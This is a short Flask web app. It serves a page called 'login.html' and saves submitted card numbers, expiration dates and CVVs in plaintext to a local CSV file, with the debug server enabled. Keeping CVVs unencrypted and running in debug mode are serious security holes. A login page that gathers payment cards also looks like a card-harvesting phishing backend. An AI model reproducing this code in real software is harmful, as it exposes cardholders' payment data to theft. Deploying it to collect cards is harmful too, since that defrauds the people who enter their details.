from flask import Flask, render_template, request
import csv

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/submit', methods=['POST'])
def submit():
    card_number = request.form['card_number']
    expiration_date = request.form['expiration_date']
    cvv = request.form['cvv']
    
    # Save to CSV file
    with open('payment_data.csv', 'a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([card_number, expiration_date, cvv])
    
    return 'Payment details saved!'

if __name__ == '__main__':
    app.run(debug=True)
